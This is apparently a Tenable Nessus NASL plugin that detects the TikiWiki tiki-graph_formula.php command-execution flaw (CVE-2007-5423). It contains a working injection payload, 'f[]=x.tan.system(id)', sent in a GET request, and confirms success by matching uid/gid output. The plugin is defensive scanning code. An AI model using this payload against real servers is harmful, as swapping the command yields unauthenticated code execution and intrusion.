#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(26968);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2007-5423");
  script_bugtraq_id(26006);
  script_xref(name:"OSVDB", value:"40478");

  script_name(english:"TikiWiki tiki-graph_formula.php f Parameter Arbitrary Command Execution");
  script_summary(english:"Tries to run a command via TikiWiki's tiki-graph_formula.php");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows arbitrary
command execution." );
 script_set_attribute(attribute:"description", value:
"The remote host is running TikiWiki, an open-source wiki application
written in PHP. 

The version of TikiWiki on the remote host fails to sanitize input to
the 'f[]' parameter of the 'tiki-graph_formula.php' script before
using it as a function call.  Regardless of PHP's 'register_globals'
setting, an unauthenticated attacker can leverage this issue to
execute arbitrary code on the remote host subject to the privileges of
the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/482006/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://info.tikiwiki.org/tiki-read_article.php?articleId=14" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to TikiWiki version 1.9.8.1 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/tiki", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue to run a command.
  cmd = "id";

  if (thorough_tests) ts = make_list("pdf", "png");
  else ts = make_list("pdf");

  foreach t (ts)
  {
    w = http_send_recv3(method:"GET",
      item:string(
        dir, "/tiki-graph_formula.php?",
        "w=1&",
        "h=1&",
        "s=1&",
        "min=1&",
        "max=2&",
        "f[]=x.tan.system(", cmd, ")&",
        "t=", t, "&",
        "title="
      ), 
      port:port
    );
    if (isnull(w)) exit(1, "the web server did not answer");
    res = w[2];

    line = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res);
    if (line)
    {
      report = string(
        "\n",
        "It was possible to execute the command '", cmd, "' on the remote host,\n",
        "which produces the following output :\n",
        "\n",
        "  ", line
      );
      security_hole(port:port, extra:report);
      exit(0);
    }
  }
}
